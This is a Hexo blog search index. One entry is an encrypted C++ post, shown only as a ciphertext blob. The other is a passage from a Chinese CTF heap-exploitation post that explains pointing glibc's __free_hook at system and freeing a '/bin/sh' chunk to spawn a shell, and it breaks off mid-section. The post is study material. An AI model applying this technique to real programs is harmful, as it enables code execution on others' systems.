<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++(1)</title>
      <link href="/2023/01/19/c-1/"/>
      <url>/2023/01/19/c-1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="553f9e8dec9ced04aa1a063d36ee2f355657d86dd305e415a806b6e213070493">88dbeb29ff03fae5d51895e173a16628732e7fd04dd9451f5ded42608ce07000d64ec6582f1b5e199e4b147ff43663d1347f63e06495156030eb66c9f5c4199f928dedafb02d2cd6cd831a27905b2f6bfaa4c2678a09e41e9a6e7b70a0ed1047fbb7ae9df82f7a19f7c513463cc347c4bf69c397e43da18841662f8ec8a8303143666677012b2e317279a97be1407751d69d6f0664a628d141340a6df827df411f14f3dcf99d709d7ea98ac83710f17bb24042dd1d4a143cddecea3996ff276e334529585b09220a8784e74e9930bcd331da60093a99cf9b6f8c3c799ec6f572a1eda81fbd4187c8df03fcdc76332bc4452c3a1afa915bc52f02e31900f08c7db6ace11356d4216ff98d27bb635443e4e64154e2d5c502822892475edf2e74b599360342ff78fcc08f3c117e4219f78c26acb0a89871d2f90f838d79c17a92605fcfc7ebc276f99a96d4867b86668a95ce4ae79f6ac6303a669599d017071f0bc29f64e10374968bc194a43a76bf516ecd004848d6e10dca919b7de1b29b0d4acc5492d8409c506385413fad8482ab953e8530675dbab463db4903883303562c3b1c43664fad5478c44b33cfcc25777b62fbe165bce8cc0354e231c63d51efafc7d0a1c02cfaa4dad29396933c87fa1213f79c8eba454b511f3897bce7d142d42970a5ddbe3696b868f9389016805b15303b16547fc5578713fc7dc3c9a0407ff1e1e45e5a53c1a37852b28d283c6ebe53c18fda341e1bac00961b0616bd9d051dac2575026a1709ed0008735b50021e69a3b8174298b9b521fdb517e903b3becc1d1fffede176dd8a6c9d3325baeac41973b9f3ac0d0008ad5c0af162111be9b2e71827bf44e92f03f30323a517f9766eedee435725d0ec33a34586de0aeb21e2ccc8f9d2a8a9c95ac594bfa684a57f32b43225dc2dcbef3df2caa4b7ed634e0047e01c7beabe1f0690dc211eb0d8c427485e78eea8cd6e3cddcd653be1d7c67ffbb9395a2c34665451cf8fd0c691b962d47e09a4db1a9e88f076f4ad1a42bb882f1df73d9cdacb29411ff3e6d4368c95cf346881ed6767f889e4bd04ae7c8cd3aaa43c9ff44beccd79984eaddf91c590b3a644cebdc5c128b3fe64d14d56fa26959ec362673d96ba2a2d87a26b05b50d381b2278058e9b41a367ea2d1b0c907f5cc93a797e7c72bfcf917f6e82526625c75dae586b18399816bc4aadd40992607435673f30056764e935856205a667af7605dbea0d01a786bab50495c091c6e800bb9acacb2be5f09bbb5da9afe288f80294968307b13a8493fdae8dc96159ac99c6e2504d2b4bdca5dd09c4f68da7874cde5d8dee20206f94dce5b6e97351f14f651d3cd81322927d4e14708b5e980ed872c30d4212b8b2365876501c31adcf6756a6af1e8ec58eabe81b510ecb770d3e372f061465c64535fe6dc64ac338da79bdf51d51ae1e2e22531ae0feed5cffcef7df46d323e9f83ac02d071be8166651dbfffaea05060196e250eb886d7c6c31a7167927efdb72072202b02ffda7c0b586762b15b8cae7d065c2cf784d261fb78c24831f1b8ee96f06c6e9fc7842c3b99c08713d0b2f368b1fc75a69b9262757f541b22bc2a55bb611d8ac835d5466aa31369cc502abfe67f97eed5f655084b5dc4f06032900baa033ed80179f0d7299b05af27dface5a5f451f7a871a3f46b92e8d543bb40d25ffce3211cae3ed127af7613aca0238942de65c681445db9fb3f98aa591755af3c37b5806ad947c6e733449fb7ca08324c4edc9c6cc74de8f72f643f1eb681580433429cab4f6ad4d38bd9e047154e3d79d15424496bf854002e7dbbd781256af35a79416f25193647e8b90632eddbdaad54a66fc4c5f5d6fa5d03f04956b55b8758a364264874a20ca495e4d949e46464feacbab0fa7ba4977333152a97233499d31a8391f368ffe4236ad5383105bcb62200bbd09689d2baa5720f85fd1d26e844aa1e3876f809bcc8da72063c642ea852629ec125f8c431095f6229a2278337d992631c039368b38191df4a3ef9ffb7c459e2c7497c395b54b8a4490c5c02e460edbfb8deb4ee9034d4812854d327239a8b1ee9c67a7ba7c77f1fbd40b4fbb8a94749a60a75983c342afa9f702e98fee28db715ff1ce25ea92064ed8026fd992ca4e499db938d90d7d21fec87bf46d8635d62767acc93fcaaeb6ce0cea8d5d6e2c3cd4b855dbb3008b88a49bc85ad68b98a10ee3acc3416af3d77e58b0a16a58267bf9edbd7f452aa788268af6a170c6edfbedc2a92db3967b262a89bfc8c9923302296298d70f692a7ee0450601887215d110581c2f90a4ee88e6d0a01c7fb7773d76924aaba41cf583e712d8c1b0be7e3e9d92d2398d87e3b4922f7aa5094673a05520c7236f595ffc1f75e573fbc7f14d13d299b40b5d1b8d9b4081b38fa8dbb7270c0fb9cea0e5214371cd417b694e7608d35214c5d8f16e5f8ca9d71ba1407877a79c95b74a988c8e19a095c6e2a84d0b84f139ef694c614c9e46ea9b5e7149dd9a50201abcbb34065112cd66293aa5b69d6cd1f1e4f737467a0a38dc4f63a68da1586176fabacd71772cf896a8487b41ce0beb77404f938df430394f196cf8d6efb20ea831054b9771fb335ccd753c4026b2716f73c9c81a1363e659ccd4e62d609f7557c02834b2cb94814ffcbdc3e775d90508f8583ef8e9e340067aecdf7f37e2f51e637c797017a9be70772f41c72fd3e237360c664a69f945b716cc98108f5bcc7eeaa6480c2fcb8ff86efc313eccefde1608ca653f6d821d7bfffc4dc02e3e43d2b6a51814344602c77e13e966c51540425353d2ecd8e3a4c194614135972242068e55a0769d4bde578f3aeea020c3ffc52b790d41104ea0195bf4df115aacc201208adcde556e143b9f5129fd5ee465662069d76605f66a09fd7f59af9bf619062fe930a838d3f6f63cc61d39e6d029b1ae15384908bcfa34b2bc2df7690adecbd68905d6d643400738bbbc73431d713ee43d4daa1fb10526e14f06c4dcb49e580a4976b00e0d908587cee4fd7c39d98825c9cf00e8811b23ed8c9b4ac1d008f68ba78ae9fad546ed58b9906178001ca611faa616d7d85b44c8980d255feecb2f49f653526b7746abf1c31c51827e9d8f8865beae8fe2c585acf88ac3b9e26c5af46e3d10a732162231efb4dff300c2bb7148ded82511b86397a1d83bd32f77df28e49b3b0bff64e53f3f8cfa95de0f063776aa5e1a7ea4f8817cab29f204a6b41397968874cb93fc60d25c36578182dbd14d905f4ab2caafb6387e0a85b3bd8d372913a0bad0cdbcb4363cd3ae49e88a32a2f643156fd4543197c566814a46471e471700f4b133c0f6d559d967cf86bb017e5029644ed5a8ece0d7e7d8a48c61ded9f26d9446fe5c0fa37afc4c42d48675016e9bf7e09a20c30b91d13ee28db2dd735e987ffd63d0d388541ba9885f6d35da53b016e2fd822abf6e6e74aa98d29ee987c471e009e8701f98f74e51cbd0869833a0072e6546f2d0504d3ea5a877801c2a777e2123759abea1c83da886a98e8aee11c8edff2abeb9614b2b90a7f81002eb53c994cf9797cc985507ab061bee0d0045046125d66b4113f0a3dab194245c84fc5a10cacdf2c7129247da0bf86c490b27d85920951a5b75213f953e9c5fede99a0ccc0e94059120d03dc4709bd0f0195698f7a515b3a271db16e72a6b3d9e6b1523dacfdbe57e07d048c8f9f0d595bfbd0a482fd62f23eaeddd33e9cb81763b478535fd794d38e79e1af8447f553e9eaf4ed43b419575016b46e07826747789bd3b0594b7bafe55ca0c89ba1b73d66ddadf91403b36618a0b5c99efee91c5254664167c02a03e9ce519d875faf8f4c6f318798e7ec88912d5a1061705459d1fdedd25b34aeaa8bd6b01262b9c33caf027c6faf5280b32ae2bdfe23e93f435fd24c077b4593749a815a550698c6a609e10e3500c6183d576fc66955e0a767e5e84d8984d1a822f5d12544be5a5d60bcf93efc8b52285707454644e23b7f69469539b5552b98f7b6fc20156f071da9dfbe31211ecdde52ca9159edad2f390d6fb0c034f900bd6c2f3fa5190da680371587e722d8fe26d34eef40c9ad220fc4a02a4b126ca974268da55baa7ff251c3652165062fe469bec026a731cdd199043286588899ce75239266d26c1f234a8e355d3f3098f2a588c8d968d61b79b734b26d8b7cf6b915303e602812deeec36c5b9ffed2967d35e01dc5c8c5a15df796931bae2e0c69320de44e94ad639436e59684981683d5bc64e5f926745b8acb998b8758ff0dabd9a4d92baba00bfdfeeb155572bbb86bd718ef2bb324e3bcd11a9c514be171d9e18a8ecc77f6d80939699dbd2c501a366ca65b77cd20a90c0e0615219b4a91a01a84b9967d64bb92743fdc47a80a425fc7ff1c1413b980f3b38be902597d0bd7082f34ecf76e0971bfd36948edb9a8bab6827655cd002618f24eec5facb67a7ba167ebc613ceec455f5f2bb987bac1cf5458759b572c2d67e4c8b48333326f1bee3579173ecb7f1ee373cb428ad3b92ab8645b49a0f2915df2d2f5935b5ef1f2009f2e195187a32faa99399bee5e2743e89be31df19611bc2001485fc2a63bb1d5bad8c72c9fd2891a2ddfc7e9772eb9048cca43ae20866c74014f5f3b11881838de69ed5795cc754fd6b53a3a51af488bea4e5196158d01dbf3a87433c919b463651c9737cb38f93994435ed3e62ba13486e4eb4062513214e968ccd094ea6afe3e95c9e3aee11acf302fdba593db09077db63abbf5576fbabddbeca2a56d66970a428fbbef10962d8a6a2b987777dab5afdbc5a2f76e350bec3ad72af5a45a7c017bbeed5d838d5bba0edfb2349aa38d5e84899dfeed3d340dbe9d0252a4654b5619023daa0db4ca7a9c291648e302ed11443f90ed74bcf58e5924b977e56d3346e8816964223281087b4bf67b0c2372b5e7cf477477852d047ad5708a0d519b43d117a7c2928fb26d0aa804f6e061f0f8ce5cc28f546f94cef229657121b0e2be6650034613e2388b6e83c32746de6987ce5b9f274145fab1797124f7e0590868fd0d8222dbb59abb91a97852a1a2181ac01164db385ae3696d8644d2f0c5e916d7cf17dcbb3d3b77f7e179b71613df79457c275946c6a79d9829bbed8be4402eebaaab93d9a2febca79484551cbac83072b1ffc3e56a8a9f323c23865600773f1c96bcb35d5cd129191c74e4752e172f44b6f4bd4225e9f5e4affedc1b5cc30c11f2a281f54e90dcb1cd76cb2a2be914645ba53714067a30e102190482cd60cd9de86c5a080b293652a5dc3c459e75a09da861df3d8382e62f568283c8bcd1051ec7abc44b4b87bc74f33fb9e1011162666692093e435cc25277aecbecf0b8b4a158f9b2a23e4353409b5d49a2f65daf8e066124fdae7fcd42f7253f61783062ca9799452f3aa22539d7bcea57edd71ee33fad5ebff48b14043436be76f7cfdba8fe90bd3661912c20c3f7d0155b7831b728216914de38c5be2e1d6c4c1fd6ec376a923473fd6532daf01e814686bfe74759819b54e50707211e90d595d3f9c61cb7f394d0b14baa579237d8ab9244763b86e9dc56738bf696e9334ec1ef8a8faf0a255cef40016f2c6676ed8baa626c7f99bc70ec069e110e0abefee8200286660aa33d0cbaa1202433d3c709bfba919e57b609644de3a2e944fe0e5618c725f5312c3b4773865dedb6cf656a5339bc53901cf73a62a057d4973abbb507bfca19c277ae92ea225278d65d8863308b8ba02ff5a92b591a37749aba79f8b4e5f5e8207ab7c10cbcc3d256229d16303fd8abb1838c3146cf56a2c0f74e76baed73ce8d5ec18433ee18843d53eea216e151838d47e3a07d57600921b41d8791d82e520a735d1812d7aa7ad6c97422cf327e5c270996725daa7d2e5a714e3b900f530f7bf61181e802b063f8b87a83e9703bd41641f8f91b8d398065727808f5f1dc207afc67d4e32b289f0cfb230b3f453cf00cd8398137315db3d6c1dcd8a142263618486d3a1bfcd98095209f3ed35613b77953cd4e313f07eee3e205c635393195b563ef157c7ead61b523eaffcaf991b9eaae43e26de86e124589a2eb75360ad70b07f33f11b5c532ec00a57ee43f193fc4b9a56f3b5d334388b0ddc1b045e9fa0eb736432f618842799bc43a3c656732948c71c78c8a44b6d47394fbcfe9d565eadc569353ff29298f46696e825fabf964311aa7fb7f64f1db59b4ba37f01c7e4477a90c8325a227021d7e4cbbdab2e24e7bf72a0c3176358eeea5972957a85d43e91766fea5fb455abec539c431c06de1d7d3f280baaa7d875ffc114551cdea7bef700c59d33263d68a6bc22e9efd714af768c48a2791a3638b6282843af01d3eba12d20bd7b82755ffa52d73acae7322d7cb78ca7d6da869df9bcdc449f0eeccf28ffc16db09149e28963d8fb1c8f120376bd4a0b1e398d88eddf9cba2bfa1a5d8d2676bfbb38dfda12c3ddc49da5581b99d33de6394e0cd24c377da856eaa49155cb175b0cb85452704088445d872a3a047c8512c6a68462e1f43ee1ee615d56dcf540e8c5789db509ffa9b86f998d1319f2e295e1dce4e3f8e47638f9d8826779e46359e3d993a6a23274453f6599cc049cb2294c6d4b4844d7edb2eca41d5ddc71591b831ab620bdaa6573e818de2225798fd85f80e5ac1720858222a2b2238641d3084618c404123d099999c1807afe145d0c4c1d3858982deaaf63aac882e5a2996672c96007390d7d4e85d6f94cbc3e33e967c12cbe44ba6b84cc19a61905f16dab74911653fcc009f60b9adcc4a3e9cfeeda28bd74f38426dec295cc734cfd6efdbebe363ce51a66839d68259812aae76535d48b879a88649f6350911ea869f9930a99eb9b9afd6ee004fea38c3ef9132fce341afe32ba7e0f356bf9466ef66cecee58c32ef603065f5b875118a3fe3ba5f3aae2ccb1bfbd1faf384c369b52be189c55fb9f8889139be82c52acea632b6f87d5e815dd90f508629ac0971e040b136fb0f70fbbbe3f0dac6b5a2e8dd8e67e1bba7a4cc6fefe688e79f799a727b4bffae7e65e5dd12a55dc33dbedeb51f9ab86d3ad87b90172787585cc33f197dfdbe88105b58c305cd435505995e1f21b67c8a5f6f170a7537b590b5a737443e322bc6ff1e4fb5bd263b85ea8cc31673bd8195aef1ab41d0f18a9459ef0fcb78285330b2cca936f59d39133c93ec52b3901263278c1415b84312248efdd033d9da69b2239f27993a6bd5e968de0e2ad74825f68dd1566c1281e31be54ebd7cc58fc7928c7f68811a177ec990f35daf0c7841d4e858be5923dda12b7e4f4a2df099c3ee708383429fa5749a0fbac98553aef04a9b7ba976eaa1e260fe9c0672691bee8adbfd864aa72f8d1ee28cebc6de681a43bf486165c1d551440e029ab6bfe56790e4ae55149c0dceb41230dcb37740c100e152328e4ad4f04847cbfe0b516948d49da7cd4dc1fa17dae3761fb519dc76aaa67012f8e921dd0990c1990ae9c303ad78f4cc2adf4fb1457771038fef677e2aa65b530c0ce0c42759951b4a807b7dd89b84c0eaf9ee4313b867a9f7005ca8812d708db27a724aaa193c282304e3b89a4c7e859a30dd9da24bf12807a86356e34fccc465e522a6839f0f37bcace2f1684e377d53f0f41f55f5fdf8e260f8cbc087c4b3cd4de21b071cdfad5adc00e8201b0ca1b8ecc789ed5afacf12407a96ffb8b15fdf8348e2c51b8d00d45c2c8d78c43d788a5940c37b3b1e546161ff1c116b444b394316562c2376a5ec40188bd3bfd99269645e345e9f7c88206009cab2d49fa4d822b1f81a235d3ce84b666356507809c63100d6f0097dd3219b59872a7283bb6b85f55aaed8b007413ee65e5fbfe3b5c31cb88c34118768b92c455b5dd1af48c719c43bca309102a61d762da132eed164442d5d53d951add9c0371b653556a676bd3194826d208e8e2cc37be3cdf7be281a2ceb095c0c8e8269fadfa612344fc23501e1ec548b36a35f6f923092428f364096e24277ada3be65b0add2905b72c079c5018df35eba2a229f5d453dea25d9ad3e354210004ba313792c7dcd9c12aa2d2d6f51c2a4596b32f88145c6fd7312f6a35f2f54656ee68e6328c9d416b3001e0632f140487d01017ed33446a26dbcf7a51afe77fa7ebea61085dbf16ff367aa3dd5693918c98c8561f36027307f41370f2dee27736231d658f413528954b2204bd16739d2b3660ebd38eb29e3d27c32c4b1f338060b6fb60876ed38a9e62ca532f5b4dc82381e75773a7a28a26e72a6637073491a43b282d3b543b769bb9deceff6cb8683c4e1c98fbeb8e119e39a64ae0f60e75aa8a5a757a84658f27f66035f91534187fd1cbe0dd5b2c1c2af89d141ccfdb062aea8e671d753b3bc55e6010a370609d1ec8f45dbb0c9af3e2e2b1521d699f7790ba6cad01cacb3045ed2a16879533daa7c9b85b72b608d4ace4eea63494b394726708daee3906fe5774da961b07c5905fe4fed0743062117b2d125b147ead2dc7ee820357ee67a76429dcb280c04e51b4a0c5f9a4901e131fff882322edbe57902695b5598b1a3929986f74cd670fe5a2b443f09417bfd820ff46f0df5a499951abd90c180e6b0bafad713d07b3e05a0c2deb701540fffe5213c879ce6acab14d8e86780daec80205a47dc5c3214a921770ad759fdbfb6c03c7546a8f5d9e2ca2b3a53a3ce5b814587aa21e43f27740ab74ea53f220c8abcdfeb1dcf817455e7109f0379c74b055367fdd536542d676f52e315bd2ce73956568502ed904723fd5968ee6afceb9a27facb2d849acf05e799c27f2adce9d5d18eab59da4a82710a00da430cd213804c1bfbee7e23583241fded97a60324633ef5d4605c2f67df5c73aeaab67caaf4ef9d66d543a47c30ae1041721d3b47af63e56cb9eab3478130e45fbe23189857e036bf7cfb44163503ab3f656c2f8d81e8094bdc8ee10b9bdc9bd18cd44f181a25f30f3f72c43c22b67061c4c6ac9e5afe07d9823e96ae2f3815c4504646302e295a7eeb7d16b7dbdd890dac034021fe8c47ea45617b15a4df9bea816042f8c67fc916729b74c525fb74f949655076ea6b71062e173f78050f9e99d98cc781ed2a11af980aa7577e30fde6eb115e158da0c9bb0764be2ebb710b76e698a634bd275f74c3ff1a2dd846a750ab51d32ca64936b93b40492aa9fec6cdf1d54231e53278e203387e53e6e6b104b100266ffa3490f79bbfad1dfaa00faaecc2bed4f1f340cbaa30da203988ddbfbbb402156e9d1bb1e5e85e4294b42a1fbded3f7224bfde9e5e48b42b1cb0e8635abb902821353cacd10b9d47454d6d20c7f43e23ee2d1761c799a63ca4778fde8f1c93015b023261092e9754e8f3f592c696cb52ab30173e5b707994f034fbf0262ea52af53a5057b97555100263cb3b23eece5a1fb730ff41183713611d10f6e5b5e24ef68cc058ccfe05d57eb68c7ddc19bb2b45d03fa67589b80383f299dc6b6cbd37c16ab16e79c7d2632e0c4933695385cbfb63e80f2eb88da18c5fa80217704ee8611cf310079a3de80bb491d53828f5d503256f1766efd1de37db39a4c1b5b31b6f78f10a0a79eccfcffd56c7679b6f5795277de1304cb58c71f11f6b9d5cccd1003b9c5a98c8e6ead0b63342fd6b35bc329222c088a9038c6022db5b3d3dc4bd3d4fc21c22b003c383176cbc28dce777accda98df0d55d23d361a63493ffb3df7be55812f83856c97206f61265eef421c35f36f0cbc661786b58e11d22731d972ff5c15dd3e03a9a1223811518b625ca8c8159afc6b3102145681a2f83966674ce37a4bfe332a1cdc49f26b4c1833bf10b8c912add2c3d6d54fabdf27720a8346101286854f980ea4efc03c76f423ecfc5f59837751eec2135249c1ccc4b7b468cd95761bc751aa090c7715aa9823029a7003da82e27e901af19db8632ed4c2c1eace0236d2c286f0264861ada13cb7619c81ef232f8ac6ca5848e56ed17ad7fe43568786dabb61ddbc265f5fb325239ec128ed743ebc0eecd99778f404418c78b32d1d6f7ade3c87cbf651ac6a1576ff775d855101d8b3c753938ee2a8815ff722f75b44c4d4fc4d06b3a20e527b18cda76cbf999c2ea1cf440e92bc1c4eccf36b7971e4e547db83bf11396e81554994e2831bd7734e3e58851b2f7051ddfcd396afc930a939a2ffd394e7404c9e4390f79647e24c6e1a8858c003a4adab00cbccf78af7fe3a3d3500dc676c954c472947026935f86e10debbdf8b64851b9ef850f655ab07a2b0f8cf2865a30a5f3558cc6f790ee4927f6ac02eb1a0852c7102ebb5466028b87b30cd39f526779f19db6680c93c37f92cb0e4549b8a257beeb39e5028fab921ccf0c9b0b2dd343fe6fc937a825e8698b9c4a084b256640cc079ce155ea664f4248105d69ff21f57935dcee0bef08882582eb57a130b9f749d719a8e47e3db4863ab3349f393595e90fa9593196feaa102259700b671d8c33c7067be951c7af44ef7db01c3e681481883ad3cd1302d32276d0519910be051158388b23109938ca7c66c12512c35af04b1a1df8cf078764a4da3668ceeafe426945880c2f45de6c3e83a5730784c3c91db51a4d096a49953daa90ab000369645e603d3baef14f3c523c18d4c2e742bac4c02ca5cebe11833a39d2b7a1e7917642b3598cf2aff57bf9990374467498ad3d90a8b321d1761c31fd5059e367dccc4a02f6efe87e9844e455f3b4d1e1c6c05f9073796113c0741a234a5a60aa6b6496d7f457ded6515f4b2ed302160fe051692ab01bf6feb8492dbf8dfda4262c210e9200f614291b15a33726f068756d777ff018334fdb5c79c0c5b9f79c9faf31cfa1d12116bb39608034c21727c4f628922a7b9a83941a20c18c10760913f64ed3054f08b475d035795e9e2cdea82f4fe644931d98ab7e2bff3408694b1e662a51cb3440b4f2138b1ece77ca0ecbb363e77404a66bc40aba5e194d850715fc068c2f50b6e6f2c84601ee7b187c12623fb872529da4606eaa0e0d86b69dff95388cfeb44bfe19157c7bc60b4924728e98c659c8ca91b47030fe12070eb1373dc3f2f5268ad5f80349a5a6fe80538f112bc002ac9270d07c15c5813aaf60dbd030cc8f3d18863038a3f0ece834c2ad02a631ffcdb4305d6fcbf34ccf370e7264d8f65971d876c4eda040aaf43f3346053ccbd26e1933322085cb0dd7e015db28a521f98cb7cbbd3c01570607f37b01ff8ee5e504713c37b62818252c2cfc937e3d266d2d22be5e2a70cedcef9a35dfc2b938442e4dfc7f9c2693aa59b3c71476b101b7d60e9c47d493b338fbc98e2f7283d4d06d5480cdcf3c6e90c66c98a2ccf5cd64736cabfb8ccd60238ae325240dd2002656332228c8ebdee0a7122ec50687b9862cb7f23b4779d265d99e5dd8275f3ff8269d3f78d079145d99d8936e93690a59ab093af50df7f0bd3d5791f554a35381f2a814cf4393bc71020e211b1cc338d2cd0e7d26c29031680f75320828210bf055378c808a8d65783420a8a076fb2b9137769a9efe9b24bfbb246e3635e5ab6b90f32df4dfb639ce381608f59346f3c1a7ffb9faa1370ee68b56312a893a25e38a85abc8f1b9c0de8c9880f5f3916dcb5d5dcb7d8fcaad152a7c36167905df27770b1964645f2dd558bad67672b5ef86070ecd14e852c4baca34e81bae8c03ae66f4b53059f15921083186901ec9f599d06e139f295cd5feddfc23511896d3754e3438c2cf2b9a8fd01f4742be8ecf0816e312ba581c63fcb010e794552d14fd03da000b4cdf7199156181eb8321c93081f487cee9fa7dffb3bc61b55f57d1f71037340b99231f7082a50bcc5c7d508c63ce8dea16c98e05ab549425e67c32ed8aabfaa73017456dc676b51b397186ab998e18ef3ca46a4e7741be3e1cea8e6a5f15e9ea21453c39b0550730cd8f37466e1dddd61ae7608409ae1e6642d7151ff7e4a003c0694d2c610a73b3ae62fa12bfbc5816fe6eba30b18790983811b453a2a73c0450f5e29ead35bf27fda0e86ac715199f3f634f2f1859403a0d1f4c3552be54468ebdc40e43b7859a49cb66cf2054d1ec7edb8e252dab4bbdaefe322f9747c8edaec6a672e4140883dd129d7f251ff33433084518ded45d2450344207d409a7212ff64925ce570bd0b52b2ea590f23e2512d20ea03cd92ca342d2d5c2476591aa7d6020182a245b667f93a6e78aa997468822f92fc24323f6f9fe113150ac526eacfc0e56f240fdd11d0906077c568b8c1aac96292f2e47c5baea25a0a0ccc22d1ec275e370190d3428057cb33a1c460c9bb7e25728e84e3d6556ad1f37d3bcec9248b5d0af77b48defc2bc9528eaa2ae5ff8b614e1942785976ae4c29376b835922e037a4f0ed19f4386b4264f4d5a4c1710952c953781a03349818951416d34d9c9aa952b4f3c2c6d2ea30cd59befaa93abf3120019f64fc5f09befb714092e323442c6d9f2a7552d2a74bd00258b397133836937781a40c485e68540bfa00c490fc3d3c49fb5eb4690ecd80ae13754344b0b67cfd4e4c7eb753cd88c5d3ff506d8f41a881731e96173b9c8975c1ba5ff61b9130bad40d3e99e6481a41e8bac6ef06ceb930f5409bc8b31d468047d93ef7a07e48b52be44b55cdabe9cfec6e6de1a9cf9885fa59429e30adcfdbd9172b54e4b1cb43419a979865d2268937c7bdea70f51bd7d81697a8807e072e886ab4d3907bc30395c29e2f3f96f2d6ae9069df674685d1ec242cba4a95fdba18e54e72c34d4b8f75071fbc3d21ce547e7015701aa8a9208edc21f677cdc78ebf55caa35c075c94bc46bbd7b2071ebdf7574224647002b69e7fc5fc6cae0c3746d9fc6fd9d3c49b33eb0dd73c3737d10ca33a3e8a9fe71d9702cd0d21586e425a14a6ba596e24265ac3522c0e7246a6a102f6f2552c526cbcf11ea914ed9d3266990ec74f31b08e058f6b0747c814ef5d2f427b1334a0a585c6052fdd13f3494d32c8c1acbffe8ad418d6403a93429a6251e9be7bcbe017941224a9696f5175d93e8f4531a2dcc053758b37b6a10b84e048714a190b77f031c2f43268c3047fd4c8d675a6e6edc5a2a981a46c54f2495099587a78a496a9a2bb918c11d2a46d9e5102c236922b34482d928d177d58ec07acae92ca6f1785de7d50d918fc006d96ceaed545fcdf6ee120d54d30649aa04253748453edc7350f6d21f26f0f7bdd305075349345a6507d5090f06a62c7e87e10eabb12fc3bbfb80c3b71e6977a2731ee29f517bb9836836c9200beffdae1c4eb781e3692fdba4accf479fd7427b0589ea3a586832af78535059aa322bc51150083de55097c50271d9a0a4473e1cbb8d0c97e04bdc0d71838dabc03a0123d3cf1f9f75d2f54459b8a369acaebac0537bbfb7a139c80b4b04a9eac503d20d8248c2de10c55c120f1f603dca291e777c836cb8abae13bfbd9676eb654e00ff7734f33ce4025f0aac152d218b23d2f2a23e91597d10671d475174113b6d2c850b10a3ba50d507a72308b86333646b6840800f56f8b0df990e14618a1a6308641298d4e4814bb9d45abafc7a3e39c7d69c118b98d7f17c0654e5a924c1dbe3ffd65ad6196772a6380a71ea0b68808df8be838042d3bbe5826692d8000da8ece11ec3f35037ef1ae22cf90935fa686ef9e389e654b857e477b13d0c8baa53bad3ccbd808c033c7ccef34274e005287f7147e3d7f2b9ade23583d6051f56d1ba6ef1f560c5e02a7c5d78922657edc960654a3d027ee8fc5008266bf2fe31820c7571bf8d5bfc0f6466e2db8d4fda10ad783d1fae95c19a33b8492a71a8e2bd65c2f17c31e195636dd8407f65bd450539bc6a2fd19b76d5a7e2148a449dd14233e0874e2ab9a4534285fc152bedb9dfadcca5ed8aeeb9f6f153fa2a4dc54fd3ba6be07b052233b0eae95cbc84cc0ca1fe4e5a247b3cb9c6ce9b18f6f3f10691772f286a0a71d851656c4aa85d6a879af1008ccee1415de59db6ba46916486d209590033b84d4f5e5193d8cb7b8aeb96600764e48f1ca888530b5bf8829fa99cd361a71c2f087361cda1a5c4728c6758893b438a1786e7aa3832f19ea3091cf9b19138a5729f8db4e7828ec825cecdb7eec06ae6d9faa2dbdccbfe67d3748baa38e48f17263500ed40a0240e454a97508dbcb1bfde7e16cbb73f37058a8cd84fbad85be52cc551b2ff957b51c33cfa997c1a7863758588a091a618be4b3b6443f2fed86265b0247fd53779dde24a07488f8554f168a1854032ebeef95fcbf0876d9ad6aca5119447d625104c87ddff99f5ad01e68aab5c9d306da81dccbea53916101014abc4dd35f4795a288eeca6c37580a2647d15c4f1ac61d2fec8505b1d9a2a8738ec01610912ac8967b5e615837ab2fff1b1419447134c082d8584d32496083a19745b2b2a8d5aad0fe8c321bd9399f591b4949b2c9a466f41c9b7730582691f47d8cac8dc3d256e959686e18822b8b90480ab624880d6a4a9ce07f03bdc9636e0951ecea0c55a4f823ad10b89f56e937d2cb495793c1eff0491e0da758e2b9f556e15790e06d5b190176abfbab7a0dda3de3323a559130fe2ab67a97987740c6d8260587ff2ea67cfbafc9b036336fafe39adc20ce3c9f8afe6fbff4398a3f0671c1ac708d9e3f1eb7676a55efa5d63221404625c63665d71f9ec1e1c2b6850b35e4bdfbd7792b40be8ea8cd90ba95125df797c7aaec2d2bea34ffa7710e8ed0bfb51b99c5e33a0c2c577e7b1148170b15f9c6604770a552e0460f0a8c1d156973d23e000431165d147ff1071ec4d446cbfb9f66383eeaca77dd80c954be76d583e648d452a704fffec6fd793f23ccc7682a445f57f17d1cac726a314de775434ed3a8151751d1f4c12a9bce0422b7075a1a115141484f3cacaf71771e643be7442c35d6bbe5c7796ed6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">私人领地</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>free_hook劫持(glibc2.26之前)</title>
      <link href="/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/"/>
      <url>/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做Full RELRO的堆题远程环境one_gadget总是无效,于是便来研究一下__free_hook劫持,加入tcache之后的__free_hook劫持比较容易，本文主要探讨glibc2.26之前的利用方法<br>要有其他方法(或是让one_gadget生效的方法)欢迎qq交流</p><h1 id="free-hook劫持原理"><a href="#free-hook劫持原理" class="headerlink" title="free_hook劫持原理"></a>free_hook劫持原理</h1><p>在调用free函数时，若__free_hook的值存在，便会先调用__free_hook指向的地址，于是可以将__free_hook的值改为system函数的地址，再free一个指向”/bin/sh\x00”的指针，便可达到system(“/bin/sh”)的效果</p><h1 id="free-hook劫持方法"><a href="#free-hook劫持方法" class="headerlink" title="free_hook劫持方法"></a>free_hook劫持方法</h1><p>不同于__malloc_hook和realloc_hook的劫持方法，由于free_hook上方一定区域内(<del>大概率?</del>)不存在能制造字节错位的条件(<del>有的话也超出了Fastbin的范围</del>)，于是直接通过<code>Fastbin Arbitrary Alloc</code>到__free_hook上方的方法基本失效<br>ps:补充一点,gdb.attach上去可以看到free_hook低地址处正好有个7f开头的地址，不过这个地址是__isoc99_scanf函数写上去的，函数执行完后便清零了(<del>血泪教训</del>)</p><h3 id="1-篡改top域"><a href="#1-篡改top域" class="headerlink" 